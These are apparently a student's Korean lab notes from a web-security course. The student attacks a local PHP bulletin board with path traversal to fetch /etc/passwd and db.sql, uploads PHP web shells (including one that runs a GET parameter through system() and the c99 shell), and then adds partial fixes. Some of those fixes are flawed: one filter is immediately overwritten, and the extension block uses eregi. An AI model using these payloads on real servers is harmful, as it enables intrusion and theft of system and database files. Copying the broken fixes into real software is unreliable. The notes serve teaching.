-rw-r--r-- 1 root root  714 2017-06-10 21:43 board_delete_ok.php
-rw-r--r-- 1 root root  388 2017-06-10 21:43 board_file_download.php
-rw-r--r-- 1 root root 3445 2017-06-10 21:43 board_list.php
-rw-r--r-- 1 root root 3405 2017-06-10 21:43 board_view.php
-rw-r--r-- 1 root root 3754 2020-10-21 11:22 board_write.php
-rw-r--r-- 1 root root 3542 2020-10-21 11:31 board_write_ok.php
drwxr-xr-x 2 root root 4096 2017-06-10 21:43 upload  -> w 권한이 없음
```

[root@Linux-04 board]# chmod o+w upload -> upload 에  w 권한 주기
[root@Linux-04 board]# ls -l

```
합계 28
-rw-r--r-- 1 root root  714 2017-06-10 21:43 board_delete_ok.php
-rw-r--r-- 1 root root  388 2017-06-10 21:43 board_file_download.php
-rw-r--r-- 1 root root 3445 2017-06-10 21:43 board_list.php
-rw-r--r-- 1 root root 3405 2017-06-10 21:43 board_view.php
-rw-r--r-- 1 root root 3754 2020-10-21 11:22 board_write.php
-rw-r--r-- 1 root root 3542 2020-10-21 11:31 board_write_ok.php
drwxr-xrwx 2 root root 4096 2017-06-10 21:43 upload


```



###### 칼리

글 삭제하고 다시 올리기

센트오에스에서 확인하면 보임

[root@Linux-04 board]# ls -l upload

```
합계 4
-rw-r--r-- 1 apache apache 61 2020-10-22 15:34 dict.txt

-> 익명이면 아파치로 올라감
```

주소창에 172.16.10.20/db.sql 쳐보면

```
update mysql.user set password=password("P@ssw0rd") where user='root';
flush privileges;

create database WebTest default character set utf8;
use WebTest;

create table member(
no int not null auto_increment primary key,
u_id varchar(20) not null unique,
u_pass varchar(50) not null,
u_name varchar(20) not null,
nickname char(20),
age int,
email char(50) ,
reg_date datetime not null);

create table board(
strNumber int not null auto_increment primary key,
strName varchar(20) not null,
strPassword varchar(20) not null,
strEmail varchar(50),
strSubject varchar(100) not null,
strContent text not null,
htmlTag char(1) not null,
viewCount int not null default 0,
filename varchar(50),
filesize int,
writeDate datetime);

insert into member values('','tester','tester','테스터','테스트계정','','',now());
insert into member values('','admin','P@ssw0rd','관리자','관리자','','',now());

-> sql 일괄처리 쿼리문이 들어가있다.
```

근데 이거보단 일반적으로 쓰는 거 알아보기

Burp Intercept ON 

파일 다운로드 클릭하면

```
GET /board/board_file_download.php?filename=dict.txt HTTP/1.1  // 원래 이렇게 뜨는데
GET /board/board_file_download.php?filename=dict.txt HTTP/1.1 //이렇게 바꾸고

포워드 하면 창이떠 -> Save 하면 
```

root@kali-04:~/Desktop# cd /root/Downloads/
root@kali-04:~/Downloads# ls -l

```
total 148
-rw-r--r-- 1 root root 149328 Oct  6 15:39 slowloris.py
 // 방금 받은 파일

```

root@kali-04:~/Downloads# vim 방금받은 파일명



원래 지금 파일 루트가 /var/www/html/board/upload 인데 root에 있는걸 빼오고 싶어

그럼 5단계 위잖아

../../../../../etc/passwd 로 넣어서 해보기

Burp 에서

```
GET /board/board_file_download.php?filename=dict.txt HTTP/1.1  // 원래 이렇게 뜨는데
GET /board/board_file_download.php?filename=../../../../../etc/passwd HTTP/1.1 // 이렇게 수정
```

홈페이지에서 다운로드 창 뜨면 다운로드하기

이건 실제로 무슨 파일인지 확인해보기

###### 칼리

root@kali-04:~/Downloads# ls -l

```
total 152
-rw-r--r-- 1 root root   1670 Oct 22 15:43 %2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
-rw-r--r-- 1 root root 149328 Oct  6 15:39 slowloris.py
```

root@kali-04:~/Downloads# vim %2F..%2F..%2F..%2F..%2Fetc%2Fpasswd 

-> 이건 아파치로 접근되기 때문에 아파치가 읽기 권한이 있는 파일만 다운로드 가능



###### 센트

[root@Linux-04 board]# ls -l /var/www/html/index.php 

```
-rw-r--r-- 1 root root 969 2017-06-10 21:43 /var/www/html/index.php
```

[root@Linux-04 board]# ls -l /etc/passwd

```
-rw-r--r-- 1 root root 1670 2020-10-16 15:50 /etc/passwd
```

-> 이 아이들은 r 권한이 있어서 다운로드 가능하다.



[root@Linux-04 board]# ls -l /etc/shadow

```
---------- 1 root root 1061 2020-10-16 15:50 /etc/shadow
```

-> r 권한 없어서 다운로드 불가능



### FILE Download 취약점(164p) 

[root@Linux-04 board]# vim board_file_download.php 

```
<?php
  $file_name = str_replace("../","",$_GET['filename']); -> 여기 추가
  $file_name = urldecode($_GET['filename']);
  $file_path = "./upload/$file_name";
  $file_size = filesize($file_path);

  header("Content-Type: application/x-octetstream");
  header("Content-Disposition: attachment; filename=".urlencode($file_name));
  header("Content-Transfer-Encoding: binary");
  header("Content-Length: $file_size");

  readfile($file_path);

 ?>

```



BURP 에서 홈페이지 다운로드 누르고 보면

```
GET /board/board_file_download.php?filename=../../db.sql HTTP/1.1 -> 으로 경로 바꿔주기
```

root@kali-04:~/Downloads# ls -l

```
total 156
-rw-r--r-- 1 root root   1670 Oct 22 15:43 %2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
-rw-r--r-- 1 root root    931 Oct 22 16:06 db.sql -> 여기
-rw-r--r-- 1 root root 149328 Oct  6 15:39 slowloris.py
```



[root@Linux-04 board]# vim board_file_download.php 

```
<?php
  $file_name = str_replace("../","",$_GET['filename']);
  $file_name = urldecode($_GET['filename']);
  $file_path = "./upload/$file_name";
  $file_size = filesize($file_path);


  $conn = mysqli_connect('localhost','root','P@ssw0rd','WebTest');
  $sql = "select filename from board where filename='$file_name'";
  $result = mysqli_query($conn, $sql);
  $return = mysqli_fetch_array($result);

  if($return['filename'] == $file_name)
  {
         header("Content-Type: application/x-octetstream");
         header("Content-Disposition: attachment; filename=".urlencode($file_name));
         header("Content-Transfer-Encoding: binary");
         header("Content-Length: $file_size");

          readfile($file_path);
  }
  else
  {
        echo "<script>alert('요청하신 파일을 다운로드 할 수 없습니다.');
                history.back();</script>";
        exit;
  }
 ?>

```





BURP 에서 on 하고 홈페이지에서 다운로드 누르면

```
GET /board/board_file_download.php?filename=../../db.sql HTTP/1.1

 이렇게 고쳐서 포워드 누르면
 
 

<script>alert('요청하신 파일을 다운로드 할 수 없습니다.');
		history.back();</script>
		
이렇게 뜬다. 
```



### FILE Upload 취약점 (171p)

###### 칼리

웹 쉘 만들기

root@kali-04:~/Downloads# cd ~/Desktop/

root@kali-04:~/Desktop# vim webshell.php

```
<?php	
		system("ls -l");
?>
```

파이어폭스 -> 게시판 -> 글쓰기

upload 제목으로 하고 파일은 webshell.php로

http://172.16.10.20/board/upload/webshell.php



다시 터미널로 와서

root@kali-04:~/Desktop# vim webshell2.php

```
<?php
		system($_GET[aaa]);
?>
```

파이어폭스 -> 게시판 -> 글쓰기 -> 제목 : upload2 파일은 webshell2.php

http://172.16.10.20/board/upload/webshell2.php?aaa=cat/etc/passwd



강사님이 c99, 파일 주심

root@kali-04:~/Desktop# ls

```
c99.zip   dnsspoof.txt  first_blind.py  passwd                 slowloris.pl  webshell2.php
dict.txt  ever_hulk.py  gFncCQxh.jpeg   pentest.co.kr_ips.txt  userlist.txt  webshell.php
```

root@kali-04:~/Desktop# unzip c99.zip

```
Archive:  c99.zip
  inflating: c99.txt         
```

root@kali-04:~/Desktop# ls

```
c99.txt  dict.txt      ever_hulk.py    gFncCQxh.jpeg  pentest.co.kr_ips.txt  userlist.txt   webshell.php
c99.zip  dnsspoof.txt  first_blind.py  passwd         slowloris.pl           webshell2.php
```

root@kali-04:~/Desktop# mv c99.txt c99.php

파이어폭스에서 -> http://172.16.10.20/board/upload/c99.php



#### 확장자(php) 막아보기

[root@Linux-04 board]# vim board_write_ok.php 

```
<?php

        session_start();

        $b_name=$_POST["name"];
        $b_pw=$_POST["pw"];
        $b_email=$_POST["email"];
        $b_sub=$_POST["sub"];
        $b_cont=$_POST["cont"];
        $b_tag=$_POST["tag"];
        $token=$_POST["token"];

        //str_replace("검색 문자열", "변경 문자열", "검색 대상");
        //$b_cont = str_replace("<script>","",$b_cont);
        //preg_replace("/검색문자열/옵션","변경분자열","검색대상");
        //$b_cont = preg_replace("/</i","&lt;",$b_cont);
        //strip_tags("검색대상","사용할태그"); -> 사용할 태그를 제외한 나머지 태그를 제거 
        //$b_cont = strip_tags($b_cont,'<h1><a>');


        // html 사용안하는 게시글은 html encoding 처리
        if($b_tag == "F"){
                //$b_cont = htmlspecialchars($b_cont);
                $b_cont = htmlentities($b_cont);
        }

        if($_SESSION['csrf_token'] != $token)
        {
                echo"<script>alert('토큰 값이 일치하지 않습니다.');history.back();</script>";
                exit;
        }

        if($_SERVER['HTTP_REFERER'] == "" || $_SERVER['HTTP_REFERER'] != "http://172.16.10.20/board/board_write.php")
        {
                echo"<script>alert('요청하신 경로가 올바르지 않습니다.');history.back();</script>";
                exit;
        }

        // file 정보 받기
        // $_FILES : form 에서 file type으로 넘어오면 여러가지 정보가 넘어오는데 이런 정보를 받아주는 슈퍼글로벌 변수
        $f_error=$_FILES["att_file"]["error"];
        if($f_error==0){
                $f_name=$_FILES["att_file"]["name"];
                $f_path="upload/".$f_name;
                $f_tmp=$_FILES["att_file"]["tmp_name"];
                $f_size=$_FILES["att_file"]["size"];
                               
                // 같은 이름의 파일이 있을 경우 이름 뒤에 숫자 붙이기
                $f_name_only=substr($f_name,0,strrpos($f_name,'.'));    // 파일이름 중 확장자를 제외한 이름
                $f_name_ext=substr($f_name,strrpos($f_name,'.'));       // 파일이름 중 확장자

                for($i=1; is_file($f_path); $i++){      // 같은 이름의 파일이 있으면 i 값을 1씩 증가시키며 반복
                        $f_name_only=$f_name_only."(".$i.")";   // 파일이름 뒤에 (번호) 추가
                        $f_path="./upload/".$f_name_only.$f_name_ext;   // 파일 경로 재설정
                }
                $f_rename = $f_name_only.$f_name_ext;   //파일이름과 확장자 다시 합치기

        }else if($f_error!=4){
                echo "<script>alert('파일 업로드 실패($f_error)');
                        history.back();</script>";
                        exit;
        }

        if(eregi(".php|.html|.asp|.htm",$f_name))  --> 이부분 추가해줌 여기부터 6줄 추가함
        {
                echo "<script>alert('해당 확장자를 가진 파일은 업로드 할 수 없습니다.')
                        history.back();</script>";
                exit;
        }
         /*
         echo "file error:".$_FILES['attachFile']['error'];
        ************ 오류 코드 ***************************
         0 : 성공
         1 : php.ini 의 upload_max_filesize 보다 큽니다.
         2 : html 폼에서 지정한  max file size 보다 큽니다.
         3 : 파일이 일부분만 전송되었습니다.
         4 : 파일이 전송되지 않았습니다.
         6 : 임시 폴더가 없습니다.
         7 : 디스크에 파일 쓰기를 실패하였습니다.
         8 : 확장에 의해 파일 업로드가 중지되었습니다.
        *************************************************
        */

        require "../dbconn.php";

        $strSQL="insert into board set strName='$b_name', strPassword='$b_pw', strEmail='$b_email', ";
        $strSQL.="strSubject='$b_sub', strContent='$b_cont', htmlTag='$b_tag',writeDate=now() ";
        if($f_error==0)
        {
                $strSQL.=", filename='$f_rename', filesize='$f_size'";
                $f_rs = move_uploaded_file($f_tmp, $f_path);
        }

        $rs = mysql_query($strSQL);
        if($rs){
                echo "<script>alert('글이 성공적으로 등록 되었습니다.');
                        location.replace('board_list.php');</script>";
        }else{
                echo "<script>alert('글을 등록하는데 실패하였습니다.');
                        history.back();</script>";
        }

?>



```



-> 이렇게 하고 게시판에서 글 쓸 때 php 첨부파일 등록하면 해당 확장자를 가진 파일은 업로드 할 수 없습니다. 팝업 뜬다.



### SSL ATTACK

#### SSL MITM (178p)

####  HeartBleed

아침에 나눠준 CentOS - HeartBleed 압축 풀기 - VMnet2

이건 CLI 임 root / keroro2424. 으로 로그인

vim 없음 vi로 해야함



vi 

```
DEVICE=eth1
TYPE=Ethernet
ONBOOT=yes
NM_CONTROLLED=no
BOOTPROTO=static
IPADDR=172.16.10.50
NETMASK=255.255.255.0
GATEWAY=172.16.10.254
DNS1=168.126.63.1

```

service network restart

칼리에서 172.16.10.50 / https://172.16.10.50 다 들어가지게 셋팅 되어있음



https://172.16.10.50/ 접속 -> 와이어샤크로 필터 SSL 로 해놓고 게시판 눌러보면 ssl로 통신하는 걸 알 수 있음

































